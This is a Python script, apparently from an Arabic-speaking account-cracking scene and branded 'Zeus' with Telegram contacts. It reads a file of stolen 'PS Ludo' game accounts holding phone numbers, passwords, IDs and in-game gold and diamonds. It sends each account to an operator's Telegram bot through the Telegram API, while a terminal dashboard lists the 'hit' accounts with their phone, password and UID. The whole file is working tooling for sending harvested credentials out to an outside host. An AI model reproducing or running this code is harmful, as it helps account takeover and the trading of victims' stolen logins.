
import os
import sys
import time
import random
import threading
import urllib.request
import urllib.parse
from datetime import datetime

BOLD   = '\x1b[1m'
RED    = '\x1b[1;91m'   # أحمر فاقع (لوكو الزهرة)
GREEN  = '\x1b[1;92m'   # أخضر فاقع (للتوكن/الـID + الأرقام)
YELLOW = '\x1b[1;93m'
BLUE   = '\x1b[1;94m'   # أزرق (القسم الأول)
PINK   = '\x1b[1;95m'   # وردي (القسم الثاني)
CYAN   = '\x1b[1;96m'
WHITE  = '\x1b[1;97m'
RESET  = '\x1b[0m'

# ألوان عدّاد الفحص (يتغيّر مع كل فحص)
COUNTER_COLORS = [RED, GREEN, YELLOW, BLUE, PINK, CYAN]


def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')


stats = {'total': 0, 'good': 0, 'error': 0}
start_time = time.time()
stop_flag = False
bot_token = ''
chat_id = ''
accounts_file = '/storage/emulated/0/accounts.txt'
hit_accounts = []   # قائمة الحسابات اللي انرسلت بنجاح


# ==================== DASHBOARD ====================#
def print_dashboard():
    clear_screen()

    # لون العدّاد يتغيّر مع كل فحص
    cc = COUNTER_COLORS[stats['total'] % len(COUNTER_COLORS)]

    # ─── لوكو الزهرة (أحمر) ───
    print(f"{RED}╱╱╭━━━┳━┳━━━┳━╮")
    print(f"{RED}╭━┫╭━╮┃━┫╭━╮┃━┫")
    print(f"{RED}┃╋┣╯╭╯┣━┣╯╭╯┣━┃")
    print(f"{RED}┃╭╯╱┃╭┻━╯╱┃╭┻━╯")
    print(f"{RED}╰╯╱╱┃┃╱╱╱╱┃┃{RESET}")

    # ─── القسم الأول (أزرق) ───
    print(f"{BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
    print(f"{WHITE}DEVELOPER {BLUE}>> {WHITE}Zeus-{RESET}")
    print(f"{WHITE}STATUS    {BLUE}>> {WHITE}Premium{RESET}")
    print(f"{WHITE}VERSION   {BLUE}>> {WHITE}V/2.0{RESET}")
    print(f"{BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
    print(f"{BLUE}◈ DEV Zeus| @R7_36 • https://t.me/R7Aih1{RESET}")
    print(f"{BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")

    # ─── القسم الثاني (وردي) ───
    print(f"{PINK}<[●]> {WHITE}FUTURES  {PINK}>> {WHITE}FILE✘CLONE{RESET}")
    print(f"{PINK}<[●]> {WHITE}DEV      {PINK}>> {WHITE}Zeus ~ @R7_36{RESET}")
    print(f"{PINK}<[●]> {WHITE}TODAYS   {PINK}>> {WHITE}{datetime.now().strftime('%d/%B/%Y').upper()}{RESET}")
    print(f"{PINK}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")

    # ─── إحصائيات (وردي) ───
    print(f"{PINK}<[●]> {WHITE}COUNTRY {PINK}>> {WHITE}Saudi Arabia{RESET}")
    print(f"{PINK}<[●]> {WHITE}HIT {PINK}>> {GREEN}{stats['good']}{PINK}   {WHITE}ERROR {PINK}>> {RED}{stats['error']}{RESET}")
    print(f"{PINK}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")

    # ─── HIT ACCOUNTS (phone | password | uid) ───
    print(f"{PINK}<[●]> {WHITE}HIT ACCOUNTS{RESET}")
    if hit_accounts:
        for h in hit_accounts[-30:]:
            print(f"{PINK}<[●]> {GREEN}{h['phone']}{WHITE} | {GREEN}{h['password']}{WHITE} | {PINK}{h['uid']}{RESET}")
    else:
        print(f"{PINK}<[●]> {WHITE}No hits yet...{RESET}")
    print(f"{PINK}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")

    # ─── العدّاد (لون متغيّر) ───
    print(f"{cc}<[●]> {WHITE}TOTAL {PINK}>> {WHITE}{stats['total']}{RESET}")
    print(f"{PINK}<[●]> {WHITE}STATUS: {PINK}>> {GREEN}SCANNING...{RESET}")


def send_to_telegram(msg, bot_token, chat_id):
    try:
        url = 'https://api.telegram.org/bot' + bot_token + '/sendMessage'
        data = urllib.parse.urlencode({'chat_id': chat_id, 'text': msg}).encode()
        req = urllib.request.Request(url, data=data)
        with urllib.request.urlopen(req, timeout=30) as resp:
            return resp.status == 200
    except Exception:
        return False


def parse_accounts(content):
    accounts = []
    blocks = content.split('✦ PS Ludo HTS ✅ ✦')
    for block in blocks:
        acc = {}
        for line in block.splitlines():
            line = line.strip()
            if not line:
                continue
            if '❖ المعرف' in line:
                acc['id'] = line.partition('➜')[2].strip()
            elif '❖ الاسم' in line:
                acc['name'] = line.partition('➜')[2].strip()
            elif '❖ الجوال' in line:
                acc['phone'] = line.partition('➜')[2].strip()
            elif '❖ كلمة السر' in line:
                acc['password'] = line.partition('➜')[2].strip()
            elif '❖ VIP' in line:
                acc['vip'] = line.partition('➜')[2].strip()
            elif '❖ الذهب' in line:
                acc['gold'] = line.partition('➜')[2].replace('💛', '').strip()
            elif '❖ الألماس' in line:
                acc['diamond'] = line.partition('➜')[2].replace('💎', '').strip()
            elif '❖ المستوى' in line:
                acc['level'] = line.partition('➜')[2].replace('⚡', '').strip()
        if acc:
            accounts.append(acc)
    return accounts


def build_message(acc):
    return (
        '✦ Zeus \n'
        '★━━━━━━━━━━━━━━━━━━★\n'
        '\n'
        '  ✧  ID       ➜ ' + acc.get('id', 'N/A') + '\n'
        '  ✧  Name     ➜ ' + acc.get('name', 'N/A') + '\n'
        '  ✧  Phone    ➜ ' + acc.get('phone', 'N/A') + '\n'
        '  ✧  Password ➜ ' + acc.get('password', 'N/A') + '\n'
        '\n'
        '  ✧  VIP      ➜ ' + acc.get('vip', 'N/A') + '\n'
        '  ✧  Gold     ➜ ' + acc.get('gold', 'N/A') + '\n'
        '  ✧  Diamond  ➜ ' + acc.get('diamond', 'N/A') + '\n'
        '  ✧  Level    ➜ ' + acc.get('level', 'N/A') + '\n'
        '\n'
        '━━━━━━━━━━━━━━━━\n'
        '  ✧  Channel ➜ @R7Aih1\n'
        '  ✧  Dev      ➜ @R7_36\n'
        '━━━━━━━━━━━━━━━━\n'
    )


def update_display():
    while not stop_flag:
        print_dashboard()
        time.sleep(1)


# ==================== MAIN ====================#
if __name__ == '__main__':
    clear_screen()
    # ─── فقط التوكن والـID بلون أخضر (بدون لوكو) ───
    bot_token = input(f"{GREEN}TOKEN >>> {RESET}").strip()
    chat_id   = input(f"{GREEN}ID    >>> {RESET}").strip()

    if not os.path.exists(accounts_file):
        print(RED + '[!] File not found: ' + accounts_file + RESET)
        sys.exit()

    with open(accounts_file, 'r', encoding='utf-8', errors='ignore') as f:
        content = f.read()

    accounts = parse_accounts(content)

    display_thread = threading.Thread(target=update_display, daemon=True)
    display_thread.start()

    sent = 0
    for acc in accounts:
        if stop_flag:
            break
        msg = build_message(acc)
        ok = send_to_telegram(msg, bot_token, chat_id)
        if ok:
            sent += 1
            stats['total'] += 1
            stats['good']  += 1
            # ← نحفظ الحساب لعرضه على الشاشة
            hit_accounts.append({
                'phone': acc.get('phone', 'N/A'),
                'password': acc.get('password', 'N/A'),
                'uid': acc.get('id', 'N/A'),
            })
        else:
            stats['total'] += 1
            stats['error'] += 1
        time.sleep(2)

    stop_flag = True
    time.sleep(2)
    print_dashboard()
    print(GREEN + f'\n[+] Done! Sent {sent}/{len(accounts)} accounts' + RESET)